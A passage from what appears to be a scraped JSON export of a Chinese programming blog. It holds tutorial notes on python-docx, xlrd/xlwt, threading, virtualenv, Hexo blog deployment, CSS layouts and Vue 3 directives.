document.sections[0].footer\nfooter.add_paragraph(\u0026ldquo;hallo word\u0026rdquo;)\n样式 p1 = document.add_paragraph() text1 = p1.add_run(\u0026ldquo;hallo WORD，hallo python-docx，你好，世界\u0026rdquo;)\n字体大小 text1.font.size = Pt(16)\n字体是否加粗 text1.bold = True\n字体 text1.font.name = \u0026ldquo;黑体\u0026rdquo;\n字体（只能设置中文） text1.element.rPr.rFonts.set(qn(\u0026ldquo;w:eastAsia\u0026rdquo;), \u0026ldquo;黑体\u0026rdquo;)\n字体颜色 text1.font.color.rgb = RGBColor(0, 0, 255)\n斜体 text1.italic = True\n下划线 text1.underline = True\n保存 document.save(\u0026ldquo;hallo.docx\u0026rdquo;)\nxlrd模块+xlwt模块(操作xlsx)\n注意：xlrd模块只有低于或等于1.2.0版本才能操作xlsx文件，高于该版本只支持xls文件，或者使用openpyxl代替xlrd模块\n导入xlrd模块 import xlrd\n加载1.xlsx data = xlrd.open_workbook(\u0026ldquo;1.xlsx\u0026rdquo;)\n判断是否加载成功，可以指定第几张工作表，0为第一个工作表 print(data.sheet_loaded(0)) #True\n卸载指定工作表 data.unload_sheet(0)\n输出全部工作表名字（Sheet） print(data.sheet_names())\n输出工作表的数量 print(data.nsheets)\n输出全部所有sheet对象 print(data.sheets())\n将指定工作表索引到变量中 main = data.sheet_by_index(0)\n名字索引到变量中 main = data.sheet_by_name(\u0026ldquo;Sheet1\u0026rdquo;)\n输出工作表名字 print(main.name)\n输出工作表有效总行数 print(main.nrows)\n输出工作表有效总列数 print(main.ncols)\n输出工作表有效总列数 print(main.row_len(1))\n输出单元格值类型和内容 print(main.row(0))\n数据类型： 空：0 字符串：1 数字：2 日期：3 布尔：4 error：5\n输出第1行第二列的单元格内容 print(main.row(0)[1].value)\n输出第二列表的全部内容 print(main.col(1))\n输出第一行的内容 print(main.row_values(0))\n输出单元格数据类型 print(main.row_types(0))\n输出第一列的内容 print(main.col_values(0))\n输出第二列的数据类型 print(main.col_types(1))\n输出第6行第一列内容和数据类型 print(main.cell(5,0))\n输出第6行第一列内容的数据类型 print(main.cell(5,0).ctype)\n输出第6行第一列内容 print(main.cell(5,0).value)\n利用xlwt模块写\n导入xlwt模块 import xlwt\nxlwt模块不支持xlsx，只支持xls\n新建workbook，字符集为utf-8 hallo = xlwt.Workbook(encoding=\u0026ldquo;utf8\u0026rdquo;)\n新建sheet abc = hallo.add_sheet(\u0026ldquo;Sheet1\u0026rdquo;)\n第1行到第3行和第1列到第9列合并并且写入hallo word abc.write_merge(0,2,0,8,\u0026ldquo;hallo word\u0026rdquo;)\n在第4行第1列写入hallo word abc.write(3,0,\u0026ldquo;hallo word\u0026rdquo;)\n批量写入 data = ((1,\u0026ldquo;hallo\u0026rdquo;,\u0026ldquo;abc\u0026rdquo;,\u0026ldquo;xyz\u0026rdquo;,123),(1,\u0026ldquo;hallo\u0026rdquo;,\u0026ldquo;abc\u0026rdquo;,\u0026ldquo;xyz\u0026rdquo;,123))\nfor i,a in enumerate(data):\rfor q,s in enumerate(a):\rabc.write(i,q,s)\r在第1行第1列写入图片，只支持bmp格式 abc.insert_bitmap(\u0026ldquo;1.bmp\u0026rdquo;, 0, 0)\n保存 hallo.save(\u0026ldquo;hallo.xls\u0026rdquo;)\n样式\n初始化 style = xlwt.XFStyle()\n初始化样式 stylefont = xlwt.Font()\n名称 stylefont.name = \u0026ldquo;宋体\u0026rdquo;\n加粗 stylefont.bold = True\n字号 stylefont.height = 11*20\n字体颜色，注意不是RGB颜色，而是在xlwt内部定义的 stylefont.colour_index = 0x0A\nstyle.font = stylefont\n初始化Alignment align = xlwt.Alignment()\n水平对齐方式 align.vert = 0x01\n垂直对齐方式 align.horz = 0x00\n应用对齐方式 style.alignment = align\n水平对齐方式 0x01(左端对齐) 0x02(水平居中对齐) 0x03(右端对齐)\n垂直对齐方式 0x00(上端对齐) 0x01(垂直居中对齐) 0x02(底部对齐)\n初始化Borders borders = xlwt.Borders()\n指定边框样式 borders.right = xlwt.Borders.DASHED\n应用边框 style.borders = borders\ntop 上边框 bottom 下边框 left 左边框 right 右边框\nDOTTED 点线 DASHED 虚线\n初始化Pattern color = xlwt.Pattern()\n填充模式为完全填充 color.pattern = xlwt.Pattern.SOLID_PATTERN\n填充黑色 color.pattern_fore_colour = 0\n应用 style.pattern = color\n应用style abc.write_merge(0,2,0,8,\u0026ldquo;hallo word\u0026rdquo;,style)\nxlrd和xlwt使用起来不是很好，而且xlwt模块不支持xlsx，因此不详细写，openpyxl才是王道\nCelery是一个基于Python开发的分布式任务调度模块\n安装\npip install celery[redis]\n如果需要redis消息中间件的话，也可以选择RabbitMQ\neasy_install是一个基于setuptools的工具，可以用来下载，编译，管理Python的包\n官网：http://peak.telecommunity.com/DevCenter/EasyInstall\n安装setuptools就会安装easy_install\npip install setuptools\n或者通过ez_setup.py来安装\nhttps://pypi.org/project/ez_setup/\n下载ez_setup.py的源程序\n安装easy_install： python ez_setup.py\n更新easy_install: python ez_setup.py –U setuptools\n安装包\neasy_install Virtualenv\n也可以通过url来安装\n将已经安装的到pypl上最新版本\neasy_install \u0026ndash;upgrade PyProtocols\n更新包\neasy_install \u0026ldquo;Virtualenv==x.x\u0026rdquo;\n或者要求版本大于某个版本：\neasy_install \u0026ldquo;Virtualenv\u0026gt;x.x\u0026rdquo;\n查找PyPI上的最新可用版本\neasy_install \u0026ndash;upgrade Virtualenv\n删除包\n只需要删除包名版本的.egg文件或者目录，如果不想继续使用删除的包，然后easy_install -mxN 包名\nPython内置多线程库threading\n进程是资源分配的最小单位，一个程序必须至少有一个进程，一个进程必须至少有一个线程\n线程是程序执行的最小单位，多线程是可以有效加速程序计算\n进程的资源独立（独立内存，地址空间等等），而线程是可以共享进程中的数据的（IPC），同一个进程下的线程，共享使用相同的地址空间（全局），但是也存在数据同步和互相排斥的问题\n导入threading模块\nimport threading\n查看全部正在运行的线程信息（不包括没启动或者已经终止的线程）\nthreading.enumerate()\n查看正在运行的线程的数量\nthreading.active_count()\n查看正在运行的线程信息\nthreading.current_thread()\n添加线程（需要接受target参数，该参数指向这个线程要完成的任务）\nthreading.Thread(target=xxx)\n启动线程\nthread.start()\n终止线程（会等待线程终止）\nthread.join()\n简单的例子：\nimport threading\rdef funs(name,data):\rprint(\u0026quot;hallo\u0026quot;,name,data)\ra1 = threading.Thread(target=funs, args = (\u0026quot;root\u0026quot;,666))\ra1.start()\ra1.join()\r执行后如果看到hallo root 666就说明已经执行线程成功了\n线程锁Lock\n同一进程下的线程是可以共享内存的，而Lock是保证多线程之间不会出现内存被乱改或者没有同步，多线程在执行修改内存后，进行lock.acquire()共享内存上锁，执行完毕在解锁lock.release()\nPython多进程库multiprocessing\nmultiprocessing库用法和threading类似，例如：\nimport multiprocessing def funs(name,data): print(\u0026ldquo;hallo\u0026rdquo;,name,data) if name==\u0026rsquo;main\u0026rsquo;: a1 = multiprocessing.Process(target=funs, args = (\u0026ldquo;root\u0026rdquo;,666)) a1.start() a1.join()\n进程池 Pool（进程池就是将需要完成的任务，放到该进程池中，由Python自己解决多进程问题）\n例如：\nimport multiprocessing\rdef demo(x):\rreturn x+x\rdef funs():\rpool = multiprocessing.Pool()\rdata = pool.map(demo, range(3))\rprint(\u0026quot;hallo\u0026quot;,data)\rif __name__=='__main__':\rfuns()\rPool自定义需调用核数量（默认为CPU的核数）\npool = multiprocessing.Pool(processes=4)\r进程锁和线程锁用法一样，就不写了\n","permalink":"https://99999.fun/posts/27/","summary":"Virtualenv是一个能创建隔绝的独立的Python虚拟环境工具。它能够建立多个相互独立，互不影响的Python工作环境\n用来创建一套独立于系统Python环境的虚拟环境，在虚拟环境下，使用pip安装的依赖都会安装到当前的虚拟环境中，对系统的python环境没有影响\n当开发多个Python程序时当，程序1要使用3.6环境，但是程序2要使用3.8环境时，Virtualenv可以完美解决这个问题\nWindows pip install virtualenvwrapper-win\n使用pip安装Virtualenv\npip3 install virtualenv\n然后创建一个Virtualenv虚拟环境\nvirtualenv webpy #webpy为虚拟环境目录名，目录名自定义\nvirtualenv -p python环境路径 虚拟环境名 #创建指定Python环境路径的虚拟环境\nvirtualenv \u0026ndash;no-site-packages 虚拟环境名 #创建一个干净的Python虚拟环境，系统Python环境的所有第三方包不会复制过来\nvirtualenv \u0026ndash;no-site-packages \u0026ndash;python=版本名 虚拟环境名 #创建一个指定python版本的虚拟环境\nworkon # 输出所有虚拟环境名 Windows\nworkon 虚拟环境名 # 进入虚拟环境 Windows\nsource 文件夹路径 # 激活当前virtualenv并进入虚拟环境\n或者进入虚拟环境目录的bin目录，输入source activate\nWindows是在虚拟环境目录下的Scripts目录，输入activate\ndeactivate # 退出当前环境\n在虚拟环境下，使用pip安装的所有第三方包都会安装到当前的虚拟环境中，不会对系统的Python环境进行\u0026quot;污染\u0026quot;\n想要删除某一个虚拟环境时，只需要将虚拟环境的目录删除\npip使用国内源\n清华：https://pypi.tuna.tsinghua.edu.cn/simple 豆瓣：http://pypi.douban.com/simple/ 中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/\n临时使用 pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pandas\nlinux下\n配置永久使用\ncd ~ # 进入用户目录 mkdir .pip # 新建一个隐藏文件夹 touch pip.","title":"Python的一些神器的简单用法"},{"content":"hexo+github可以实现免费搭建一个博客网站，就是维护起来有点麻烦\napt install npm\nnpm install hexo-cli -g\nhexo init blog\ncd blog\nnpm install\nhexo server\n使用NexT\napt install git\ngit clone https://github.com/theme-next/hexo-theme-next.git\n把hexo-theme-next文件夹放到hexo根目录的themes文件夹下\n启动主题\n打开hexo目录下的_config.yml文件，这个文件为站点配置文件\n找到theme，修改值为hexo-theme-next\n调试模式\nhexo s \u0026ndash;debug 查看是否输出有错误，方便修改错误信息\n选择主题\n打开主题的根目录的_config.yml文件，这个文件是主题配置文件\n找到scheme，需要启动的在前面去掉#注释即可，不需要就加注释#\n设置 语言\n打开站点配置文件，修改language为需要的语言zh-CN\n修改菜单\n打开主题配置文件，找到menu，需要用到的菜单就去掉#，不需要就加#\nhome 主页 archives 归档页 categories 分类页 tags 标签页 about 关于页面 commonweal公益 404\n修改对应的语言翻译\n主题目录下languages/zh-CN.yml\n设定菜单项的图标，可以使用的是Font Awesome 图标\n设置 侧栏\n打开主题配置文件\n修改sidebar.position的值\nleft - 靠左放置 right - 靠右放置\n设置 头像\n打开主题配置文件，修改avatar值设置成头像的链接地址\n可以是url，也可以站点内的地址\n设置 作者昵称\n打开站点配置文件，设置 author 为作者的昵称\n站点描述\n打开站点配置文件\n设置 description 字段为你的站点描述\n百度统计\n打开主题配置文件\n修改字段 baidu_analytics 字段，值设置成百度统计 id\n添加RSS功能\nnpm install hexo-generator-feed –save\n编辑主题配置文件，修改rss，rss: /atom.xml\n标签 页面\nhexo new page tags\ntype: \u0026ldquo;tags\u0026rdquo;\n分类 页面\nhexo new page categories\ntype: \u0026ldquo;categories\u0026rdquo;\n设置代码高亮主题\n打开主题配置文件\n修改highlight_theme\n可选的值有 normal，night， night blue， night bright， night eighties\n侧边栏社交链接\nsocial\n格式是 显示文本: 链接地址\nsocial_icons\n格式是 匹配键: Font Awesome 图标名称\n友情链接\n打开主题配置文件\nlinks\n404页面\n新建 404.html 页面，放到主题的 source 目录下\n推荐使用腾讯公益404页面\n站点建立时间\n打开主题配置文件，since\n来必力\n打开主题配置文件，livere_uid: LiveRe UID\nGoogle 分析\n打开主题配置文件， 修改字段 google_analytics， 值设置成 Google 跟踪 ID。跟踪 ID 通常是以 UA- 开头。\n腾讯分析\n打开主题配置文件 里将 ID 放置 tencent_analytics\nCNZZ 统计\n在主题配置文件中添加cnzz_siteid的配置项，值为 CNZZ 里面添加统计的站点ID\n百度分享\n打开主题配置文件 添加/修改字段 baidushare，值为 true\n搜索服务\n如何设置 阅读全文\n在文章中使用 手动进行截断，Hexo 提供的方式\n打开主题配置文件，添加： auto_excerpt: enable: true length: 150\n部署到Github git config \u0026ndash;global user.name \u0026ldquo;chenjunlinabc\u0026rdquo; git config \u0026ndash;global user.email \u0026ldquo;a@xiaochenabc123.test.com\u0026rdquo;\nssh-keygen -t rsa -C \u0026ldquo;a@xiaochenabc123.test.com\u0026rdquo;\n检查是否连接上github\nssh -T git@github.com\n设置deploy参数\n打开主题配置文件\ndeploy: type: git repo: git@github.com:chenjunlinabc/chenjunlinabc.github.io.git branch: main\ngithub的分支默认为main\n安装一个插件 npm install hexo-deployer-git \u0026ndash;save\nhexo clean 清理缓存\nhexo g 进行渲染\n部署到git服务器，hexo d\n关于每次hexo d后，GitHub Pages自定义域名都会失效的解决方法\n在source目录下添加一个文件CNAME就好\n该文件放域名\n","permalink":"https://99999.fun/posts/26/","summary":"hexo+github可以实现免费搭建一个博客网站，就是维护起来有点麻烦\napt install npm\nnpm install hexo-cli -g\nhexo init blog\ncd blog\nnpm install\nhexo server\n使用NexT\napt install git\ngit clone https://github.com/theme-next/hexo-theme-next.git\n把hexo-theme-next文件夹放到hexo根目录的themes文件夹下\n启动主题\n打开hexo目录下的_config.yml文件，这个文件为站点配置文件\n找到theme，修改值为hexo-theme-next\n调试模式\nhexo s \u0026ndash;debug 查看是否输出有错误，方便修改错误信息\n选择主题\n打开主题的根目录的_config.yml文件，这个文件是主题配置文件\n找到scheme，需要启动的在前面去掉#注释即可，不需要就加注释#\n设置 语言\n打开站点配置文件，修改language为需要的语言zh-CN\n修改菜单\n打开主题配置文件，找到menu，需要用到的菜单就去掉#，不需要就加#\nhome 主页 archives 归档页 categories 分类页 tags 标签页 about 关于页面 commonweal公益 404\n修改对应的语言翻译\n主题目录下languages/zh-CN.yml\n设定菜单项的图标，可以使用的是Font Awesome 图标\n设置 侧栏\n打开主题配置文件\n修改sidebar.position的值\nleft - 靠左放置 right - 靠右放置\n设置 头像","title":"简单搭建一个hexo博客"},{"content":"居中布局\n分水平居中和垂直居中，水平+垂直居中\n水平居中：当前元素在父级元素容器中，水平方向是居中显示的\ninline-block+text-algin\n#app{\rtext-align: center;\r// 父元素，文本内容居中对齐\r}\r.child{\rdisplay: inline-block;\r// 子元素，行内块级元素\r}\r优点：浏览器兼容性好（css2）\n缺点：text-align具有继承性，会导致子元素的文本也是居中的\ntable+margin\n.child{\rdisplay: table; // 也可以为block\rmargin: 0 auto;\r// 子元素，margin外边距，上下为0，左右为auto（浏览器自动分配）\r}\r优点：只需要对子元素设置，就可以实现效果\n缺点：如果子元素脱离正常流，将会导致margin属性的值无效化\nabsolute+transform\n#app{\rposition: relative; // 父元素相对定位\r}\r.child{\rposition: absolute; // 子元素绝对定位，如果父元素没有定位，那么该元素是相对于页面定位，父元素定位了，那么该元素是相对于父元素的\rleft: 50%; // 相对于父元素左边50% transform: translateX(-50%); // 子元素水平平移-50%（左负数，右正数）\r}\r优点：父元素是否脱离正常流，也是不影响子元素的水平居中效果\n缺点：transform属性是css3的新属性，浏览器兼容性比较差\n垂直居中：当前元素在父级元素容器中，垂直方向是居中显示的\ntable-cell+vertical-algin\n#app{\r// 父元素\rdisplay: table-cell;\rvertical-align: middle; // 设置文本的垂直方向对齐方式\r}\r优点：浏览器兼容性好\n缺点：vertical-align属性具有继承性\nabsolute+transform\n#app{\rposition: relative;\r}\r.child{\rposition: absolute;\rtop: 50%;\rtransform: translateY(-50%);\r}\r优点：父元素是否脱离正常流，也是不影响子元素的垂直居中效果\n缺点：transform属性是css3的新属性，浏览器兼容性比较差\n水平垂直居中：水平方向居中，也要垂直方向居中\ntable+margin（水平），table-cell+vertical-algin（垂直）\nabsolute+transform\n#app{\rposition: relative;\r}\r.child{\rposition: absolute;\rtop: 50%;\rleft: 50%;\rtransform: translate(-50%,-50%);\r}\r多列布局（两列布局+三列布局+CSS3 多列布局）\n两列布局：其中有一列是确定宽度，而另外一列则是自动填满（指定宽于自适应）\nfloat+margin\n.left{\rwidth: 100px;\rfloat: left;\r}\r.right{\rmargin-left: 100px;\r}\r优点：简单\n缺点：自适应元素的margin属性值要和定宽元素的width属性值保持一致\n或者给定宽元素position: relative，自适应元素给float: right和width: 100%,margin-left: -100px\nfloat+overflow\n.left{\rwidth: 100px;\rfloat: left;\r}\r.right{\roverflow: hidden;\r}\r优点：简单\n缺点：overflow属性会导致内容溢出（BFC）\ndisplay：table\n#app{\rdisplay: table;\rtable-layout: fixed;\r}\r.left{\rwidth: 100px;\r}\r.left,.right{\rdisplay: table-cell;\r}\r优点：浏览器兼容性好\n缺点：父元素的display属性设置为table，会受到制约\n三列布局：三列，有两列是确定宽度，另外一列自动填满（指定宽于自适应），一般中间那一列是内容区\n效果实现和二列一样\n圣杯布局\n头部和底部都占页面100%宽度，高度固定，中间区域是一个三栏布局，三栏布局两侧宽度确定，中间部分自动填充（一般中间那是内容区）\n中间部分一般是三栏中最高的（因为是内容区）\nfloat\n头部和底部填满宽度，三列设置浮动和相对定位，中间部分的放在前面\n三列设置overflow: hidden和padding-left（值为left的宽度），padding-right（值为right的宽度）\nleft栏设置margin-left: -100%,就返回到左侧了，然后left，值为负的left高度\nright栏right，值为负的right高度，margin-left，值为负的right高度\n例如：\n\u0026lt;style\u0026gt;\rheader{\rmax-width: 100%;\rheight: 100px;\rbackground-color: aqua;\rtext-align: center;\r}\rfooter{\rmax-width: 100%;\rheight: 100px;\rbackground-color: aquamarine;\rtext-align: center;\r}\rmain{\roverflow: hidden; padding-left: 20%;\rpadding-right: 20%;\r}\rmain div{\rfloat: left;\rposition: relative;\rtext-align: center;\r}\r.center{\rwidth: 100%;\rheight: 600px;\rbackground-color: blue;\r}\r.left{\rheight: 300px;\rwidth: 100px;\rbackground-color: azure;\rmargin-left: -100%;\rleft: -100px;\r}\r.right{\rheight: 300px;\rwidth: 100px;\rbackground-color: bisque;\rright: -100px;\rmargin-left: -100px;\r}\r\u0026lt;/style\u0026gt;\r\u0026lt;header\u0026gt;\r头部\r\u0026lt;/header\u0026gt;\r\u0026lt;main\u0026gt;\r\u0026lt;div class=\u0026quot;center\u0026quot;\u0026gt;\r中间\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026quot;left\u0026quot;\u0026gt;\r左\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026quot;right\u0026quot;\u0026gt;\r右\r\u0026lt;/div\u0026gt;\r\u0026lt;/main\u0026gt;\r\u0026lt;footer\u0026gt;\r底部\r\u0026lt;/footer\u0026gt;\rflex\n用flex弹性盒子比较简单一点，只需要给三列设置flex，按照左中右排列，中间部分设置flex: 1;\n优点：简单，不需要设置dom\n缺点：（flex）浏览器兼容性比较差\n双飞翼布局\n双飞翼布局和圣杯布局效果和要求类似，侧边宽度确定，中间自适应，不同的是，圣杯布局是在父元素设置内边距，两侧通过定位和浮动来插入到中间，而双飞翼布局是直接设置一个dom来放置三列\n三列设置左浮动，中间设置宽度为100%，left设置外边距为负100%，right设置外边距为其本身宽度，中间设置外边距为两侧腾出位置，值为left和right的宽度\n例如：\n\u0026lt;style\u0026gt;\rheader{\rmax-width: 100%;\rheight: 100px;\rbackground-color: aqua;\rtext-align: center;\r}\rfooter{\rmax-width: 100%;\rheight: 100px;\rbackground-color: aquamarine;\rtext-align: center;\r}\rmain{\rtext-align: center;\roverflow: hidden;\r}\r.center{\rwidth: 100%;\rheight: 600px;\rbackground-color: blue;\rfloat: left;\r}\r.center div{\rmargin: 0 100px 0 100px;\r}\r.left{\rheight: 300px;\rwidth: 100px;\rbackground-color: azure;\rfloat: left;\rmargin-left: -100%;\r}\r.right{\rheight: 300px;\rwidth: 100px;\rbackground-color: bisque;\rfloat: left;\rmargin-left: -100px;\r}\r\u0026lt;/style\u0026gt;\r\u0026lt;header\u0026gt;\r头部\r\u0026lt;/header\u0026gt;\r\u0026lt;main\u0026gt;\r\u0026lt;div class=\u0026quot;center\u0026quot;\u0026gt;\r\u0026lt;div\u0026gt;\r中间\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026quot;left\u0026quot;\u0026gt;\r左\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026quot;right\u0026quot;\u0026gt;\r右\r\u0026lt;/div\u0026gt;\r\u0026lt;/main\u0026gt;\r\u0026lt;footer\u0026gt;\r底部\r\u0026lt;/footer\u0026gt;\r其他布局\n等分布局：子元素平均分配父元素的宽度\n等高布局：子元素在父元素中高度相等\n全屏布局：一般是一个顶部，一个底部，中间是两栏（一个侧边栏，一个主栏）\n侧边栏一般为确定宽度的，主栏为自适应，顶部和底部是占页面100%宽度，一般会设置外边距来分开\n吕形布局：就是页面分为两个容器，一般第一个容器是导航栏，第二个容器是内容区，常见于移动端布局\n九宫格布局\n","permalink":"https://99999.fun/posts/24/","summary":"居中布局\n分水平居中和垂直居中，水平+垂直居中\n水平居中：当前元素在父级元素容器中，水平方向是居中显示的\ninline-block+text-algin\n#app{\rtext-align: center;\r// 父元素，文本内容居中对齐\r}\r.child{\rdisplay: inline-block;\r// 子元素，行内块级元素\r}\r优点：浏览器兼容性好（css2）\n缺点：text-align具有继承性，会导致子元素的文本也是居中的\ntable+margin\n.child{\rdisplay: table; // 也可以为block\rmargin: 0 auto;\r// 子元素，margin外边距，上下为0，左右为auto（浏览器自动分配）\r}\r优点：只需要对子元素设置，就可以实现效果\n缺点：如果子元素脱离正常流，将会导致margin属性的值无效化\nabsolute+transform\n#app{\rposition: relative; // 父元素相对定位\r}\r.child{\rposition: absolute; // 子元素绝对定位，如果父元素没有定位，那么该元素是相对于页面定位，父元素定位了，那么该元素是相对于父元素的\rleft: 50%; // 相对于父元素左边50% transform: translateX(-50%); // 子元素水平平移-50%（左负数，右正数）\r}\r优点：父元素是否脱离正常流，也是不影响子元素的水平居中效果\n缺点：transform属性是css3的新属性，浏览器兼容性比较差\n垂直居中：当前元素在父级元素容器中，垂直方向是居中显示的\ntable-cell+vertical-algin\n#app{\r// 父元素\rdisplay: table-cell;\rvertical-align: middle; // 设置文本的垂直方向对齐方式\r}\r优点：浏览器兼容性好\n缺点：vertical-align属性具有继承性\nabsolute+transform","title":"css常见布局"},{"content":"vuejs的核心层就是只关心视图层的，本笔记使用的是最新版本的vue3\nvue全家桶：Vue+VueRouter+Vuex\nvue名字来源于法语（中文翻译为视图），可以看出其对视图层的重视\n导入一般都是使用cdn导入或者直接下载vuejs进行托管，也可以使用npm安装或者使用官方的CLI来构建一个应用\nhttps://unpkg.com/vue@next\ncjs版本：完整版，包含编译器\nprod.js都是开发版，代码进行了压缩\nglobal版本：可以直接通过scripts标签导入，会建立一个全局Vue对象\nbrowser版本：包含esm,浏览器模块\nbundler版本：该版本不是完整版，min\nvuejs模板支持所有JavaScript表达式\nvuejs本身是用声明式渲染把数据渲染到html dom中，渲染格式为{{\u0026hellip;}}，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;p\u0026gt;{{ hallovuejs }}\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo ={\rdata() {\rreturn {\rhallovuejs: \u0026quot;hallo vuejs!\u0026quot;\r}\r}\r}\rVue.createApp(hallo).mount(\u0026quot;#app\u0026quot;)\r\u0026lt;/script\u0026gt;\rvue本身携带了一些指令，主要特征就是带有v-前缀，用来渲染html dom上的一些行为，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;a v-bind:href=\u0026quot;url\u0026quot;\u0026gt;{{ main }}\u0026lt;/a\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo ={\rdata() {\rreturn {\rurl:\u0026quot;https://xiaochenabc123.test.com\u0026quot;,\rmain: \u0026quot;小陈的辣鸡屋\u0026quot;\r}\r}\r}\rVue.createApp(hallo).mount(\u0026quot;#app\u0026quot;)\r\u0026lt;/script\u0026gt;\r这个v-bind:href，就是将a标签的href属性绑定，v-bind可以绑定任何属性，例如class属性等等，因此可以在视图层留下一些接口指令，让vuejs来响应式渲染出视图\n而vue还提供了可以绑定事件的v-on属性，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;button v-on:click=\u0026quot;go\u0026quot;\u0026gt;{{ main }}\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo ={\rdata() {\rreturn {\rmain: \u0026quot;hallo\u0026quot;\r}\r},\rmethods: {\rgo: function(){\rconsole.log(\u0026quot;hallo vuejs\u0026quot;);\r}\r},\r}\rVue.createApp(hallo).mount(\u0026quot;#app\u0026quot;)\r\u0026lt;/script\u0026gt;\rv-on可以绑定多个事件，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;button @click=\u0026quot;goclick\u0026quot;@dblclick=\u0026quot;yesclick\u0026quot;\u0026gt;{{ main }}\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo ={\rdata() {\rreturn {\rmain: \u0026quot;hallo\u0026quot;\r}\r},\rmethods: {\rgoclick:function(event){\rconsole.log(\u0026quot;hallo vuejs\u0026quot;)\rconsole.log(event.target) // event.target可以获取到触发该事件的dom元素\r},\ryesclick:function(){\rconsole.log(\u0026quot;hallo word\u0026quot;)\r}\r},\r}\rVue.createApp(hallo).mount(\u0026quot;#app\u0026quot;)\r\u0026lt;/script\u0026gt;\rv-model可以进行数据的双向绑定，不但可以赋予元素中的数据，也可以获取元素中的数据，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;input v-model=\u0026quot;main\u0026quot;\u0026gt;{{ main }}\u0026lt;/input\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo ={\rdata() {\rreturn {\rmain: \u0026quot;hallo\u0026quot;\r}\r},\r}\rVue.createApp(hallo).mount(\u0026quot;#app\u0026quot;)\r\u0026lt;/script\u0026gt;\rv-show可以根据表达式的值来判断是否显示，方法和v-if一样，但是隐藏的方法是加上了display: none;，v-show不支持template和v-else，如果没有频繁切换的需求可选择v-if，频繁切换会重新渲染情况严重，而且v-show只是修改css属性而已\nv-if可以进行条件判断，会根据表达式的值来判断，例如\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;span v-if=\u0026quot;yes_no\u0026quot;\u0026gt;{{ main }}\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo ={\rdata() {\rreturn {\ryes_no: true,\rmain: \u0026quot;hallo\u0026quot;\r}\r},\r}\rVue.createApp(hallo).mount(\u0026quot;#app\u0026quot;)\r\u0026lt;/script\u0026gt;\r当值为false时，该元素就会被隐藏\nv-else 该指令必须跟着v-if或者v-else-if指令的元素的后面，否则不会被识别，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;span v-if=\u0026quot;yes_no\u0026quot;\u0026gt;{{ main }}\u0026lt;/span\u0026gt;\r\u0026lt;span v-else\u0026gt;这是v-if判断为假时渲染，v-if判断为真时不渲染\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo ={\rdata() {\rreturn {\ryes_no: false,\rmain: \u0026quot;hallo\u0026quot;\r}\r},\r}\rVue.createApp(hallo).mount(\u0026quot;#app\u0026quot;)\r\u0026lt;/script\u0026gt;\rv-else-if，必须前面的元素中有v-if或者v-else-if指令，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;span v-if=\u0026quot;yes_no == 'yes'\u0026quot;\u0026gt;yes_no == yes\u0026lt;/span\u0026gt;\r\u0026lt;span v-else-if=\u0026quot;yes_no == 'no'\u0026quot;\u0026gt;yes_no == no\u0026lt;/span\u0026gt;\r\u0026lt;span v-else\u0026gt;yes_no != no||yes\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo ={\rdata() {\rreturn {\ryes_no: \u0026quot;yes\u0026quot;,\ryes: \u0026quot;yes\u0026quot;,\rno: \u0026quot;no\u0026quot;,\rmain: \u0026quot;hallo\u0026quot;\r}\r},\r}\rVue.createApp(hallo).mount(\u0026quot;#app\u0026quot;)\r\u0026lt;/script\u0026gt;\rv-for可以多次渲染元素，例如：\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;ul\u0026gt;\r\u0026lt;li v-for=\u0026quot;a in arr\u0026quot;\u0026gt;\r{{a}}\r\u0026lt;/li\u0026gt;\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo ={\rdata() {\rreturn {\rarr:[\r\u0026quot;hallo\u0026quot;,\r\u0026quot;abc\u0026quot;,\r\u0026quot;xyz\u0026quot;,\r\u0026quot;yes\u0026quot;,\r\u0026quot;no\u0026quot;\r]\r}\r}\r}\rVue.createApp(hallo).mount(\u0026quot;#app\u0026quot;)\r\u0026lt;/script\u0026gt;\r注意：当v-for和v-if出现在同级时，v-for优先级比v-if高，因此不要在v-for下，使用v-if过滤，应该在v-if下使用v-for，v-if应该使用\u0026lt;template\u0026gt;（\u0026lt;template\u0026gt;不会创建dom元素）\nv-html可以插入html\n\u0026lt;div id=\u0026quot;app\u0026quot;\u0026gt;\r\u0026lt;span v-html=\u0026quot;main\u0026quot;\u0026gt;\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst hallo ={\rdata() {\rreturn {\rmain: \u0026quot;\u0026lt;p\u0026gt;hallo 